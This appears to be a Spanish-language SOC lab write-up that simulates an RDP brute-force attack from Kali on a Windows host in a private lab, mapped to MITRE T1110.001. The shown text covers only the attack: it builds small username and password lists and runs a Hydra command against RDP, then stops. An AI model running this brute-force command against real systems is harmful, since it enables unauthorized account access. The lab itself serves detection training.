# LAB-01 | RDP Brute Force con Hydra - Detección SOC

## Objetivo
Simular ataque de fuerza bruta RDP desde Kali hacia Windows.

**MITRE:** T1110.001 - Brute Force

## 1. Topología Usada
- Atacante: Kali 192.168.10.10/24
- Víctima: PC Windows 192.168.20.30:3389
- Firewall: FortiGate WAN 192.168.10.1 / LAN 192.168.20.1
- SIEM: Wazuh 192.168.20.20

## 2. Ataque con Hydra (Kali)

```bash
# Crear listas
echo -e "administrator\nuser\ndan" > users.txt
echo -e "123456\npassword\nP@ssw0rd" > passwords.txt

# Ataque RDP
hydra -L users.txt -P passwords.txt rdp://192.168.20.30 -V -f
